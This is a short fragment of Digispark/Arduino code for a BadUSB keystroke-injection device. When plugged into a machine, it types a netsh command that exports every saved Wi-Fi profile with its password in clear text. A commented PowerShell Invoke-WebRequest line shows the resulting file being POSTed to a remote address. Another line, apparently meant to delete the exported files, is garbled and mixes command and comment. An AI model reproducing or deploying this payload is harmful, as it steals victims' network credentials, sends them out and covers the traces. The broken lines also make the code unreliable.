...
void loop() {
  ...
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the Wi-Fi-PASS
  // powershell Invoke-WebRequest -f61-338c-470f-a0ec-0f6011dc9a16 -Method POST -InFile Wi-Fi-PASS
  del Wi-Fi* /s wifi passwd and saving them in temporary dir
  DigiKeyboard.delay(500);
